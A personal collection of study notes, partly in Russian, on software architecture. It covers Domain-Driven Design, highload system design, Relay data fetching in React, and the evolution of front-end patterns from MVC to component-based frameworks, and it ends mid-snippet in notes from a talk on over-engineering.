# Architecture knowledge

# OOP

...

---

# Functional Programming

...

---

# SOLID

...

---

# Design Patterns

...

---

# DDD

## Bounded Context is a central pattern in Domain-Driven Design

[https://martinfowler.com/bliki/BoundedContext.html](https://martinfowler.com/bliki/BoundedContext.html)

https://martinfowler.com/bliki/images/boundedContext/sketch.png

DDD is about designing software based on models of the underlying domain.

So instead DDD divides up a large system into Bounded Contexts, each of which can have a unified model - essentially a way of structuring MultipleCanonicalModels.

DDD's strategic design goes on to describe a variety of ways that you have relationships between Bounded Contexts. It's usually worthwhile to depict these using a context map.

---

## An Introduction to Domain-Driven Design - DDD w/ TypeScript

[https://khalilstemmler.com/articles/domain-driven-design-intro/](https://khalilstemmler.com/articles/domain-driven-design-intro/)

Domain-Driven Design is an approach to software development that aims to match the mental model of the problem domain we're addressing.

The goals of DDD are as follows:

- Discover the domain model by interacting with domain experts and agreeing upon a common set of terms to refer to processes, actors and any other phenomenon that occurs in the domain.

- Take those newly discovered terms and embed them in the code, creating a rich domain model that reflects the actual living, breathing business and it's rules.

- Protect that domain model from all the other technical intricacies involved in creating a web application.

`If we're building an app that helps recruiters hire talent, we need to spend some time understanding the domain language and processes that exist from the recruiters' perspective.`

`A large part of DDD is protecting the domain model by using a layered architecture. Check out this article on what each layer is responsible for.`

https://khalilstemmler.com/img/blog/ddd-intro/clean.jpg

### Building Blocks

https://khalilstemmler.com/img/blog/ddd-intro/ddd-diagram.svg

#### Entities

Domain objects that we care to uniquely identify.

Things like: `User`, `Job`, `Vinyl`, `Post`, `Comment`, etc.

Entities live a life enabling them to be `created`, `updated`, `persisted`, `retrieved` from persistence, `archived` and `deleted`.

Entities are compared by their unique identifier (usually a UUID or Primary Key of some sort).

https://khalilstemmler.com/img/blog/ddd/entity-lifecycle.svg

### Value Objects

Value objects have no identity. They are attributes of Entities.

Think:

- `Name` as a Value Object on a `User`.

- `JobStatus` as a Value Object on `Job`

- `PostTitle` as a Value Object on `Post`

```js
// A valid (yet not very efficient) way to compare Value Objects

const khalilName = { firstName: "Khalil", lastName: "Stemmler" };
const nick = { firstName: "Nick", lastName: "Cave" };

JSON.stringify(khalil) === JSON.stringify(nick); // false
```

### Aggregate

The most powerful part about aggregates is that they dispatch Domain Events which can be used to co-locate business logic in the appropriate subdomain.

### Domain Services

`Domain Services are most often executed by application layer Application Services / Use Cases. Because Domain Services are a part of the Domain Layer and adhere to the dependency rule, Domain Services aren't allowed to depend on infrastructure layer concerns like Repositories to get access to the domain entities that they interact with. Application Services fetch the necessary entities, then pass them to domain services to run allow them to interact.`

### Domain Events

Using Domain Events, instead of adding more and more if/else blocks like this:

```ts
class UserController extends BaseController {
  public createUser () {
    ...

    await User.save(user);

    // After creating a user, we handle both:

    // 1. Recording a referral (if one was made)
    if (user.referred_by_referral_code) {
      // calculate payouts
      // .. there could be a lot more logic here
      await Referral.create({ code: this.req.body.referralCode, user_id: user.user_id });
    }

    // 2. Sending an email verification email
    EmailToken.createToken();
    await EmailService.sendEmailVerificationEmail(user.user_email);

    // mind you, neither of these 2 additonal things that need to get
    // done are particularly the responsibility of the "user" subdomain

    this.ok();
  }
}
```

https://khalilstemmler.com/img/blog/ddd-intro/events.svg

### Technical Benefits

- write testable business-layer logic

- spend less time fixing bugs

- watch a codebase actually improve over time as code gets added to it rather than degrade

- create long-lasting software implementations of complex domains

---

## DDD на практике. Проектирование списка желаний (на php)

[https://habr.com/ru/post/335834/](https://habr.com/ru/post/335834/)

---

# Event Sourcing

...

---

# Microservices architechure

...

---

# Architecture of highloaded applications

## Архитектура высоконагруженных приложений. Масштабирование распределенных систем.

[https://habr.com/ru/company/badoo/blog/185220/](https://habr.com/ru/company/badoo/blog/185220/)

---

## Что такое highload и как его изучать

[https://proglib.io/p/highload/](https://proglib.io/p/highload/)

### Подготовка

- Сервисно-ориентированная архитертура
  (сервис авторизации, сервис фотографии)

- Вертикальное масштабирование
  (купить железку, поставить больше памяти РАМ)

- Горизонтальное масштабирование
  (не храним состояние, отсутствие общих узлов)

- Отложенные вычисления
  (статистику потом обработать, загрузка данных)

- Асинхронная обработка
  (милион писем отослать паралельно)

- Использование толстого клиента
  (как фейсбук, перекладывание на браузер множетсво работы)

- Кеширование
  (кешировать данные, не хтмл)

- Функциональное разделение
  (разделить формы и новости)

- Шардинг
  (2 милиона пользователь разбить на сервера - по 1 милиону на 1 сервер)

- Виртуальные шарды
  (создаем тысячи маленьких виртуальных серверверов и перекидываем на физический множетсво)

- Центральный диспетчер
  (перенаправление пользователей на другой виртуальный шард)

- Репликация
  (Запись дешевле чем чтение, из-за этого запись делать на 1 сервер, а чтение разбить на 3)

- Партиционирование
  (Разбиение Бизнес Логики)

- Денормализация
  (Хранение данных в удобной для чтения, но не для дб)

- Введение избыточности
  (хранить данные в нескольких экземляров - сообщения)

- Параллельное выполнение
  (Выполнение (разбиение) действий сразу на нескольких серверах - например feed в вк)

### Пошаговый алгоритм разработки высоконагруженной системы

1. Бизнес-Логика
   Опишем бизнес-логику будущей системы, включая потенциальные пути развития системы

2. Цифры (сколько сообщей будет публиковаться в день и все-все)
   Посчитаем объемы хранимых данных и скорость их приращения. Выбираем критический путь - хранение, запись или чтение данных?

3. Деградация (выясняем где можно ужаться - 1 секунду подождать дольше на действие?)
   Определить допустимую деградацию функций системы

4. Данные (Что происходит с данными от начала до конца - пользователь создает пост, что дальше)
   Построим схему движения данных и примем решение, какие из особенностей проектируемой системы мы будем использовать

5. Просит
   Проектируем схемы хранения данных

6. Ломаем
   Ломаем систему и смотрим, что у нас получится

---

## How to Develop a High-load System Based on Node.js, Cassandra and Redis

[https://magora-systems.com/high-load-system-node-js-cassandra-redis/](https://magora-systems.com/high-load-system-node-js-cassandra-redis/)

https://magora-systems.com/uploads/pages/96/GPAS_article_image_1.jpg

https://magora-systems.com/uploads/pages/96/GPAS_article_image_2.jpg

---

## Особенности разработки высоконагруженных клиентских приложений

[https://www.youtube.com/watch?v=t_Zp2ZVKpU0](https://www.youtube.com/watch?v=t_Zp2ZVKpU0)

### Высоконагруженные клиентские приложения - что это?

- Высоконагруженные данными (Data-Driven)
  ВСТРЕЧАЕТСЯ НА КЛИЕНТЕ

- Высоконагруженные вычисления,
  динамические приложения (Calculation-Driven)
  НЕ ВСТРЕЧАЕТСЯ НА КЛИЕНТЕ

- В контексте React
  (огромные графы или деревья)

### Data fetching в React-приложениях

Из документации по React:

- Superagent
  легковестная библиотека для Ajax

- Falcor
  от Netflix

- Request
  Упрощенный клиент для HTTP-запросов

- Axios
  Promise based HTTP client for the browser and node.js

- Apollo
  GraphQL клиент

- Relay Modern
  JavaScript framework для разработки нагруженных данными React-приложений

Форматы общения клиента с сервером:

REST

gRPC / JSON-RPC

GraphQL

XML vs JSON vs ProtoBuf vs FlatBuf

### На чем сейчас остановимся?

1. React <-> REST
2. React <-> Relay

- Relay Modern: основной инстументарий

### Проектирование: базовые принципы и архитектура React-приложения

- Придерживаемся концепции `Shared Nothing`
- Структуризация данных в небольших сторах (`Effector`)
- Один стор == Одинь модуль / сервис
- Кэшируем все, что только можно. Согласованность кэша
- Не используем JOIN-ы, если этого на самом деле не требуется
- Организовываем центральный диспетчер событий и мутации данных

### Архитектурные уровни приложения

- Network layer
  Как мы будем получать данные

- Data layer
  Как данные будут структоризироваться на клиенте

- Functional layer
  Уровень самих компонентов

### Что делать, если Redux?

- Разделение на бизнес-логику и логику представления

- Декларативная реализая представления

- createNamespaceReducer
  (@ghadyani-framework/redux-utils)

- Создание отдельных сервисов для мониторинга данных уровня бизнес-логики

- Использование селекторов свойств

Вещать на Middlewares сервисы like API (хорошее, но такое)

Лучше Effector

### Relay Modern

- композитная, декларативная выборка данных - GraphQL => модуляризация выборок

- Совместные определения данных и представлений

```js
const UserProfile = Relay.createFragmentContainer(
  // View: React-component (fc or class)
  props => {
    const user = props.data;
    // ...
  },
  // Data: GraphQL-fragment
  // Фрагмент сам по себе матчится с тем, что ожидается в props.
  graphql`
    fragment UserProfile on User {
      name
      photo { uri }
    }
  `
);

// Дальше контейнер фрагмента используется как React-component:
<UserProfile data={...} />
```

Старый relay (БЫЛО)

```js
// Некоторый компонент, в котором определяется Fragment
Greeting = Relay.createContainer(Greeting, {
  fragments: {
    greetings: () => Relay.QL`
      fragment on Greetings {
        hello
      }
    `,
  },
});

// Другой компонент, в котором используется Fragment первого
App = Relay.createContainer(App, {
  fragments: {
    greetings: () => Relay.QL`
       fragment on Greetings {
        username
        ${Greeting.getFragments("greetings")},
      }
    `,
  },
});
```

relay modern (СТАЛО)

```js
// Некоторый компонент, в котором определяется Fragment
Greeting = createContainer(
  Greeting,
  graphql`
    fragment Greetings_greting on Greetings {
      hello
    }
  `
);

// Другой компонент, в котором используется Fragment первого
App = createContainer(
  App,
  graphql`
    fragment App_greetings on Greetings {
      username
      ...Greeting_greeting
    }
  `
);
```

### Relay: Refetch Container

### Relay: Mutations

### Relay: Subscriptions

https://t.me/relaymodern

---

# Common knowledge

## Contemporary Front-end Architectures

[https://blog.webf.zone/contemporary-front-end-architectures-fb5b500b0231](https://blog.webf.zone/contemporary-front-end-architectures-fb5b500b0231)

https://miro.medium.com/max/2000/1*v3KuRCLBRyahUEd3LvRbgQ.png

### Father’s MVC — The original

`If there could be first principle of software development, then it is SoC — Separation of Concern. And probably, MVC pattern is its first bold manifestation.`

    This MVC was only meant for desktop application. Web was not born. We are talking about a decade prior to that.
    Forget Web, sophisticated GUI driven operating systems did not exist.
    It means that application software was very close to underlying hardware.

`Today, in React, Vue or Angular this view-controller pair is conceptually same as component although exact mechanics are different with respect to handling state.`

https://miro.medium.com/max/2000/1*tSHnhDsSqO8s-DoYz65x6A.png

    View and Controller contains a direct reference to Model but not vice versa. It means Model is not dependent on UI and can change without worrying about UI concerns.
    Model implements Observer pattern and one or more View objects subscribe to it. When Model changes, it raises the event and View finally updates after reacting to the event.

https://miro.medium.com/max/2000/1*kH_WAHhAHwlkakG_3CSp3Q.png

Today, we no longer use this MVC and thus sometimes referred to as classical MVC or Father’s MVC.

### Get Going with Application Model

`Complex graphical interfaces need additional state which exists only for helping UI widgets and enabling better user experience.`

https://miro.medium.com/max/2000/1*bwgTY2J_peAqtJfBntIiyw.png

`The essence of a Presentation Model is of a fully self-contained class that represents all the data and behavior of the UI window, but without any of the controls used to render that UI on the screen. A view then simply projects the state of the presentation model onto the glass.`

### Age of Modern Desktop Architectures

`It was no longer necessary for Controllers to listen to input devices. The idea of View object changed.`

`The idea of View in a front-end world is very much analogues to this idea of View. In the context of Web, a View is an entire page.`

`In summary, the team ended up rotating the MVC model by 60 degrees which they called it as Twisting the triad. That’s how we get MVP.`

    The Presenter oversees the presentation logic. The presenter can change the view directly. View delegates user events to the Presenter.
    Depending on the implementation, View subscribes to the Model and relies on Presenter for complex logic or in other case, View simply relies on Presenter for everything.

As concluded in his papers on GUI architectures, Martin Fowler has divided MVP implementation into Supervising Controller MVP and Passive View MVP. Differences and data flows are explanatory from the diagram.

https://miro.medium.com/max/2000/1*x2qIc63c5vcCHn3PgkoRNQ.png

### MVVM — Model View ViewModel

    ViewModel is an object that exposes bind-able properties and methods which are consumed by the View.
    MVVM has additional Binder entity that is responsible for keeping View in sync with the ViewModel. Every time a property on ViewModel changes, View is automatically updated to reflect the changes on UI.

https://miro.medium.com/max/2000/1*91X64FqoT3qyOTAk-WoSQA.png

`Data Binding, inherent in MVVM, has been the basis of many Front-end libraries including Knockout, Angular, Vue.js, React and others.`

### Into the Realm of Web Applications

`The major confusion in the community is because of the unawareness that desktop MVC and web MVC are two different patterns. Only if web MVC would have been named something else, things would have been much clearer.`

`The struggle of large scale web application architecture is determining what part of the code should execute where. Either we have server-driven apps or rich client-driven applications. Between the two, we can mix-match in endless ways.`

The browser mediates between three types of interactions:

    Between client-side (JS + HTML) code and server-side code.
    Between user and server-side code.
    Between user and client-side code.

Browser has its own Model, View and Controller. As a developer, we need not worry about browser MVC.

#### Server-side MVC a.k.a. Model 2

First well-known implementation of Server-side MVC is the Model 2 by Sun Microsystems for Java web applications.

https://miro.medium.com/max/2000/1*8fIGy5R1IKCw9YqxsTBbig.png

    Desktop MVC has two Data cycles while Web MVC has three Data cycles.
    There are two View cycles. First is a Client View Cycle such as scroll-event, keyboard inputs, etc. Second is Server View Cycle such as page refresh, hyperlink activation, etc.
    Finally, we have a Model Cycle which has additional time complexity as it passes the client-server boundary.
    Front Controller: A component typically provided by the underlying technology stack to handle HTTP request dispatching. For example, Servlet container in Java web applications, IHttpHandler in ASP.NET or HTTP.Server class in Node.js.

Today, SSR — Server Side Rendering means altogether a different concept. However, that is not true. Since entire HTML/content is produced by server and no client-side JavaScript code is involved, web applications fully built with Server-side MVC are still considered as SSR.

#### Going beyond the Server-side

https://miro.medium.com/max/2000/1*HvJqq3kPk5shGllje9P7jQ.png

### Essential RIA — Rich Internet Application Architecture

Building RIA is a complex operation and has evolved from the learning of previous desktop-based GUI architectures. ViewModel, Observers, Components, etc. are some of the things that are borrowed from these architectures. Oliver steel, in his 15 years old blog post (believe me, it is one of the best article), has provided nice reference architecture for understanding RIA data flows.

https://miro.medium.com/max/2000/1*djsR1eypdR6EGt3xi5FtPg.png

#### GUI Patterns are hard?

`GUI patterns are applicable at the boundary of HCI — Human Computer Interaction. User and Side Effect are inherently part of the pattern.`

Most of the Web UI patterns can be classified into three phases, viz, Evolutionary, Revolutionary and Contemporary.

https://miro.medium.com/max/2000/1*cVWSlbakigjYhzcb5nBuOg.png

### DOM-infused Algorithms

I do not think if it was intentional but jQuery simplified DOM APIs to such extent that it was hard to distinguish from the normal language APIs. This in turn allowed developers to literally mix DOM API (View Layer) with the business logic (Model).

jQuery — HTML Code

https://miro.medium.com/max/806/1*E-7ahArwj2MiIX6hFGZoDg.png

jQuery — DOM infused algorithm

https://miro.medium.com/max/1344/1*OVr1iSw2Gk2GjcsZeNkk4Q.png

In above code snippet, Model, View and Presenter/Controller are sort of mashed into one monolith code structure

### Backbone.js — MV\*

As we saw with jQuery, when developing applications, the way to structure and organize our code is clearly missing. That is exactly where Backbone.js comes into the picture as a next Evolutionary Solution. It was one of the first libraries to bring the benefits of MVC style to the client-side.

https://miro.medium.com/max/1400/1*gwqrTD0iby0zZwFkGCJJAA.png

`Some developers feel Backbone is MVP where View is analogous to Presenter, Template is View whereas Backbone Model and Collection constitute Model.`

`As Addy Osmani puts in his blog, it’s ultimately best not to force Backbone to fit any specific design patterns. Design patterns should be considered flexible guides to how applications may be structured and, in this respect, Backbone fits neither MVC nor MVP. Instead, it borrows some of the best concepts from multiple architectural patterns and creates a flexible framework that just works well.`

That is how MV\* or Model-View-Whatever is born.

Compared to previous jQuery, Backbone helps produce more structured code.

View Template in Backbone.js

https://miro.medium.com/max/1400/1*d4hc1A6yhrdMzEbWsgBGlQ.png

Creating a Model in Backbone.js

https://miro.medium.com/max/1084/1*9HXHlHLB9VX71Vk0TwEgyg.png

Creating an instance of View in Backbone.js

https://miro.medium.com/max/1138/1*NyASpMDLSGZZHsZCw0edHA.png

Link View and Model in Backbone.js

https://miro.medium.com/max/920/1*oq3V5E433JY1HBVX_wPhYQ.png

if our back-end is RESTful and it is implied that front-end code is simply a mean to represent server-side Model, then Backbone is pre-configured to sync with the API:

Automatically generated collection methods in Backbone.js

https://miro.medium.com/max/1038/1*F2EArDPNB7ylZASsh9EIBw.png

And, then there are many other small conventions baked into Backbone which simply feel like as an extension. On a closing note, Backbone may not have been the only solution at that time, but it was truly pioneering work in terms of code structure and organization. Like jQuery, it was adopted by many products.

### Knockout.js — Data Bindings for Front-end

Knockout.js is our final case study in basic patterns. It aims to implement MVVM — Model-View-ViewModel for JavaScript

    Easy to read: Declarative code aids in programming
    Reducing boilerplate: Bindings allow us to automatically update DOM whenever ViewModel changes, as well as update the ViewModel whenever the View changes via user inputs.
    Observable: Knockout provides higher level abstraction on top of events. This allows Knockout to automatically tracks dependencies between ViewModel props. If required, we can subscribe to Observable properties.

Knockout.js View — Two-way binding

https://miro.medium.com/max/1400/1*9J5K3UXvwWZe5rAmy4IxjQ.png

ViewModel in Knockout.js — Reactivity using Computed properties

https://miro.medium.com/max/1072/1*i5otGWil2gI033PXqyKNuw.png

`Often, with Knockout Model is assumed to be residing on server-side. ViewModel simply asks server-side Model using Ajax or equivalent.`

`This is where the Revolutionary Journey of Angular 1, Aurelia, Ember.js, etc. begins.`

### Angular 1 — Let Me Have the Control

`Angular 1 is Revolutionary Solution in a sense that it clearly marked the departure from the idea of simply extending server-side MVC with client-side code sprinkled across pages. Angular 1 made SPA a first-class, almost de-facto solution for building next generation user experiences.`

Prior solutions were more libraries than framework. Angular 1 is, without doubt, a well-defined framework. A necessary distinguishing factor between a framework and library is IOC — Inversion of Control. Further to qualify as a framework, Angular 1 exhibit:

    Well-defined MVVM: Angular 1 has clear Model, View and ViewModel objects.
    Dependency injection (DI): Angular 1 has first-class support for DI which provided managed lifecycle for Model objects. In Angular 1, application’s Model is implemented using Service. Service is a singleton entity by default which is often desirable for Model objects.
    Data binding & change detection: Data bindings are declarative and change detection is automatic. Data binding the necessary component to qualify it as MVVM. Bindings were bidirectional. Further change detection was almost automatic (Angular 1 was truly magical). It reduced lots of boilerplate code for developers. Use of events and overall subscription mechanism generally reduced. This is very prevalent in MVC based systems. Events also reduce code readability since data flow for certain workflow is spread across the code.
    Module system: Angular 1 introduced module system specific to the framework. Modules are the basis of code organization for virtually every language. JavaScript did not have module system till 2015 (Browsers did not support it till 2018). Angular was way ahead of its time in terms of organization.

At the same time, Angular 1 was also criticized for the complexity it introduced. Most important criticism is that it was modeled after server-side constructs. It is not idiomatic for front-end developers. Few things were simply bad:

    Namespace collision: Though DI was great, but it was implemented using Service Locator pattern which used global name space. That made it almost mandatory to prefix services.
    Bidirectional data bindings: It might have been a great idea at that time, but over the period, it is realized that it doesn’t really scale well. Especially the rise of React made two-way data binding optional. Bi-directional bindings can create lots of spaghetti code if not careful.
    Use of confusing terminology: Some of the terminology used by Angular 1 was clearly confusing. For example, Angular 1 has $scope which acts as a ViewModel, but it also had Controller which would augment $scope object. Probably right name could have been VMFactory or equivalent. Also, Angular 1 has three types of Service recipes, out of which one is named Service.

There were many other small problems. Additionally, Angular 2 or simply Angular was a complete breaking change to an extent that it is like a completely new framework. I do not find anything common other than name and few concepts.

https://miro.medium.com/max/2000/1*9Z1gjHNFdksHdzVOVIJOBg.png

`Angular 1 had a long-lasting legacy on the front-end community`

### Contemporary Front-end Architectures

Modern day applications are very close to the way desktop applications are. Some of the notable changes in today’s environment are:

    Web is no longer confined to desktop machines. We have host of gadgets like tablets, mobiles, smart watches, glasses, etc. In fact, mobile phones drive more web traffic than computers.
    JavaScript, the language powering the Web, has evolved into a full-blown language and continues to evolve with many new features.
    New API like File System, Camera, PWA, Hardware sensors, etc. are available for web applications.
    User Experience is the deciding factor for users choosing between the competing services.
    Network infrastructure has improved but at a same time, next billion under-privileged users are joining Web. Streaming, video-on-demand is a daily affair.
    Same JS technology stack is being used to build native mobile applications using various tools and cross-compilers.
    Many new frameworks and tools use JavaScript as a target language instead of using it as a source language. Few good examples are Elm, PureScript, ReasonML, etc.

`Earlier Software Architectural Patterns modeled and respected limited hardware capability. Today, that is not the case. Computing capacity is ever increasing. And, software architecture reflects that perspective.`

Above hypotheses can be linked to how today’s front-end architectures are. These architectures have converged on three core principles.

#### 1. Data flow takes the center stage

`The only way to do that in a large code base is to ensure that we understand how data is flowing in the application. This is the most important goal of the software architecture.`

The emphasis on clearly segregating State and View is very high. This is evident from the shift from simple event-based to more sophisticated state containers like Redux, Vuex, Ngrx, etc. Due to heavy reliance on Events or Pub/Sub systems, the data (or the control flow) would flow across the application in bits and pieces.

Angular 1 already showed that two-way data flow, even localized to a view or component, can create untangled mess of control flow. Also, React has proved that uni-directional data flow is easy to reason about and as such, modern frameworks including Angular 2 have followed the suit.

#### 2. Component-based Architecture

First is the Data Flow emphasis: Traditional architectures focused on splitting responsibilities horizontally
However, data-flow based thinking demands that the responsibility be split vertically

Second is the Ever-growing View State: In past, the ratio of View State to Business State was low.
But as applications get more interactive, this ratio has gone up exponentially.

Third aspect has to do with the finding the atomic unit of UI development. It begins with a question:

    What is the best way to share a UI functionality? Sharing a UI functionality means it could have some or all the four pieces:

    Structure (HTML — View), Style (CSS — View), Behavior (JavaScript — ViewModel) and a Business Logic (Model).

    That is where the idea of Component is born. And we realize that component is simply a good implementation of MVVM pattern or MV* pattern to be precise…

`This whole abstract idea of components allowed framework authors to define concrete implementations as per their needs.`

Additionally, good components are highly composable and enable fractal architecture

`A component could be a function, class, module or bundled code generated by a bundler like Webpack.`

As said earlier, a component is simply a well implemented MVVM pattern.

An endless fractal of components implementing MVVM — Loop within loop! Does it sound like Inception?

https://miro.medium.com/max/1400/1*JAUVqKsEqkiMxDjuCexknQ.gif

`A good architecture enables multiple levels of abstractions. It allows us to view one abstraction (level of details) at a time without worrying about the other levels. That is a key ingredient to make a Testable and Readable Solution.`

#### 3. Let framework take care of the DOM

    Representing DOM as a function of Model: Combined with components, declarative data bindings are a great solution to represent View in terms of Model. Angular has templates. React uses JSX. Vue supports both JSX and templates. Combining data binding with component, we get a perfect MVVM.
    Change detection: A framework needs a mechanism to identify what all data of the State has changed. Angular 1 used expensive digest cycle. React favors immutable data structures. With immutable data, detecting a state change is simply an equality check. No need for dirty checking! Vue.js relies on its reactivity systems built on top of getters/setters. Angular uses Zones for change detection. Vue 3 will use ES2015 proxies for reactivity.
    Updating the DOM: After actual changes are detected, a framework needs to update the DOM. Many frameworks like React, Vue, Preact, etc. use Virtual DOM (time optimized) while Angular uses Incremental DOM (memory optimized).

### Defining a Contemporary Front-end Architecture

`Most of the modern frameworks have already standardized the notion code structure and organization with the help of Components. They are the atomic units of today’s architecture.`

Envisioning a good component-system is the most fundamental need for any front-end architecture or framework. Beyond that it must address many other issues as discussed earlier like declarative DOM abstraction, explicit data flows, change detection, etc. Most of these elements are highlighted in the following diagram:

Elements of Contemporary Front-end Architecture

https://miro.medium.com/max/2000/1*WnGCkZ6DQd37c1xGCZWngg.png

With all those considerations in mind, we might be tempted to create a reference architecture, but it is simply impossible. Every framework or library has its own library peculiarities when it comes to implementation. For example, React and Vue, both favor unidirectional data flow but React prefers immutable data while Vue embraces mutability. So, it is better to refer individual framework to get a complete sense of its architecture.

Having said that, we can still attempt to create an approximation of the reference architecture as show below:

The reference architecture for contemporary age

https://miro.medium.com/max/2000/1*m6svWk0Jp1nF3CYFIKNBHA.png

`The most important change in contemporary architecture is the notion of Model.`

Model is no longer visualized as a single black box. It is segregated into application wide global state and component wide local state. Global state is typically managed using sophisticated state containers like Redux, Mobx, Vuex, etc. Local state for each component is an union of three things — slice of global state, component’s private local state (async data, animation data, UI state) and finally state passed as props by the parent component. We can think of local state as a better abstraction of Model and ViewModel. When we add GraphQL to this equation, state management changes. (explained in GraphQL section)

#### An incomplete picture

This reference architecture does not really capture the entire essence of contemporary architectures. Majority of the web traffic is driven by static websites and CMS’s — Content Management Systems. Modern tooling has considerably changed the way we develop and deploy these applications. In case of CMS, they are becoming Headless by decoupling their front-end from the back-end. Rise of Strapi, Contentful, etc. is evident. At a same time, we are no longer building static website using plain HTML and CSS. Static site builders and generators have become extremely popular to do the same. We can now use the same front-end framework to build static websites aided by sophisticated build tools. With React.js, we can use Gatsby.js and with Vue.js, we have Nuxt.js. When we compile our code, it produces a static website which can be fully deployed to any static web server. This technique is known as Pre-rendering as opposed to Server Side Rendering.

`This is here we have next contemporary architecture for building static websites. Idea is to take headless CMS like Strapi and use a static site builder like Gatsby to build the front-end. At a build time, when we are generating static website, we pull all the data from the CMS and generate pages.`

`When, the author changes the content in headless CMS, we re-trigger the build of our static website which builds the website with new content and immediately deploy to server or CDN.`

Building static website — The contemporary way

https://miro.medium.com/max/2000/1*3fuXSoEr70NRwrqAdpOZVg.png

Quoting the vision from the Nuxt.js website —
`We can go further by thinking of an e-commerce web application made with nuxt generate and hosted on a CDN. Every time a product is out of stock or back in stock, we regenerate the web app. But if the user navigates through the web app in the meantime, it will be up to date thanks to the API calls made to the e-commerce API. No need to have multiple instances of a server + a cache anymore!`

`To sum it up, contemporary front-end solutions are built on component-based unidirectional architectures.`

Taking unidirectional architectures further, there are many ways in which they can be implemented. Frameworks have their own ways of doing things. Few good examples to consider are:

    Flux (Envisioned for React)
    Redux (Mostly used with React, but view agnostic)
    MVU — Model View Update (Used in Elm)
    MVI — Model View Intent (Used in Cycle.js)
    BEST, Vuex, Ngrx, etc.

### Contemporary or Modern???

While completing our definition of contemporary, we must tie all the loose ends. We must link our past to the present and the upcoming future. I can think of three possible links —

    Past — Relating today’s component to historical MV*
    Present — Scene with Web Components
    Future — Functional components

#### Relating today’s component to historical MV\*?

`If this is still confusing, consider Vue.js for example. A Vue Component is a perfect implementation of MVVM while at a same time, we can use Vuex (Unidirectional State Container for Vue) to manage application-wide state. Architecture lives at multiple levels of abstraction.`

#### The Scene with Web Components

Component architecture being the basis of almost any framework, an attempt is being made to standardize the notion of components as an official Web Standard, though the reasoning behind them was entirely different. Also, I am referring to them as an attempt because even after being a standard, many framework authors have raised concerns about their feasibility.

It doesn’t mean that we should altogether avoid them when we are defining our own technology stack. The general advice is to start small with leaf components like button, checkbox, radio, etc. Always exercise caution.

#### Functional components, hooks, WTH?

When we refer to a Component as an implementation of MVVM, we generally expect a ViewModel object whose props and methods are used by View via bindings. In case of React, Vue, Angular, etc., it is generally the Class instance. But these frameworks also have a concept of Functional Component (component without any local state) where the instance simply does not exist. Also, React has now recently introduced a new way of writing components using Hooks which allows us to write Stateful component without class syntax.

React hooks — Do you notice the lack of `this` pointer?

https://miro.medium.com/max/1230/1*qrSW0ce9e1W0Rnd6Rd36Dg.png

`It looks like Functional Components are future. Though, I won’t call hooks a fully-functional long-term solution (weird at best), but at a syntax level it is elegant and brings a relief to age old problem of classes. If I cannot convince you that why syntax matters, have a look at Svelte.`

### Next phase of Contemporary Architectures

Every new technology that is associated with web applications will impact front-end applications one-way or another. Currently, there are three trends — GraphQL, SSR and Compilers, that we must discuss here to conclude this article.

#### GraphQL

GraphQL is a server-side query language. As you might have read, it replaces REST. But that is not true. When we talk about REST, it is a meta pattern. At a concept level, it embraces Resources-oriented architecture to define application Domain Model and at an implementation level, it uses semantics of HTTP protocol to exchange these resources so that it confers to the way Web is sharing the information.

`GraphQL clients have a built-in support for caching across multiple requests.`

This simple fact has allowed developers to kill lots of boilerplate code associated with State Management. On a very large scale how it shapes up is still to be seen. The exact mechanics of how that happens is very well documented in following posts:

https://hackernoon.com/how-graphql-replaces-redux-3fff8289221d

https://blog.apollographql.com/reducing-our-redux-code-with-react-apollo-5091b9de9c2a

Be sure to explore GraphQL as it is the next big thing.

#### SSR — Server Side Rendering

Traditionally, server-side MVC was prominent and server would generate static or dynamic HTML page which was easily crawl-able by search engines. Due to the awesome user experience that is possible with client-side frameworks, we are slowly rendering everything on browser. A typical HTML page returned by server when requesting fully client-side rendered application is almost an empty HTML page:

Initial HTML file for SPA applications — Almost empty!
https://miro.medium.com/max/986/1*4RNSCRzE2UfOrN-gYBfd1g.png

`SSR is the next step in evolution as it abstracts away the Client and Server distinction.`

### Age of Compilers : Svelte — Compiler or diminishing Framework?

`Like static site builder, Svelte runs at build time, converting your components into highly efficient imperative code that surgically updates the DOM.`

Being a compiler, it can do things other frameworks cannot do:

    Giving accessibility warning at build times
    Implementing code level optimizations
    Generating Smaller bundles
    Incorporate DSL into JavaScript without breaking syntax

The explicit goal is to write less code. Svelte proves that compiler can achieve lot many things that were previously impossible with plain JavaScript. If Svelte is not enough, then we have Stencil.js which is a TypeScript + JSX compiler for writing Web Components.

`As again, the future of front-end development is bright with compilers.`

#### There are other ways! The Majestic Monolith!!!

While full client-side frameworks are rage now-a-days, it is not the only way of doing things. The diversity of web still lives. There are still many applications that are heavily server-driven. They will continue to do so.

But does that mean they will continue to have inferior experience? Definitely not! Architecture is envisioned to support the product and Basecamp team has preciously done with their framework, Stimulus. Read more to understand their philosophy:
https://m.signalvnoise.com/the-majestic-monolith/

Strudel.js is another modest framework on similar lines. In 2019, we can probably supplement using contemporary DOM library like RE:DOM.

---

## Архитектурные этюды как не угробить архитектуру своего проекта

[https://www.youtube.com/watch?v=rEU7hogGwzA](https://www.youtube.com/watch?v=rEU7hogGwzA)

### О чем доклад

- Архитектура
- Типичные ошибки
- Решения

### PouchDB БД на клиенте

```js
var db = new PouchDB("dbname");

db.put({
  /*...*/
});

db.changes().on("change", function () {
  console.log("Пора обновить данные");
});
```

Конфликты (не поддерживает)

CRDT
conflict-free replicated data type
Мы разрулим все конфликты когда-нибудь потом

Это АВТОР в 2010

### нельзя так делать!

### Почему?

Писал на 2х фреймворках (react, angular) и решил выбрать для проекта новый (Vue), еще не зная, что придется писать.

Есть ТЗ, посмотрел туториал по нему, придерается к строчке в туториале, решает, что нужно делать лучше (цитата Линуса про структуры данных) и переосмыслевает код (вместо локал стоража, добавляет фетч).
Потом прочитал статью на хабре про недостатки фетча месячной давности и внедряет оттуда axios (которая еще была не проверена).
Решил что интерфейс должен быть оптимистичный (без ошибок и алертов).
Прочитал про конкурента mongoDB и внедрил PounchDB (WTF?!).
Услашал 1 доклад про CRDT (модное слово), прочитал доку и внедрил.

### Архитектура

#### Решения

- Важные
- Неотложные

Уровни архитектуры

- Код (Мы тут)
- Требования (Не полные могут быть)
- Процесс (отчитывается по времени - аутсорс. или метрикам - продукт)
- Бизнес (деньги платят)

`- А что делать мне?`
`- Будь проще и ленивее`

#### Один из принципов Lean

Предельно отсроченное принятие решений

Пока не приперло - не выбирайте ничего.

Если впилим что-нибудь - принесет денег?

```js
function fetch() {
  var todos = JSON.parse(localStorage.getItem(STORAGE_KEY) || "[]");

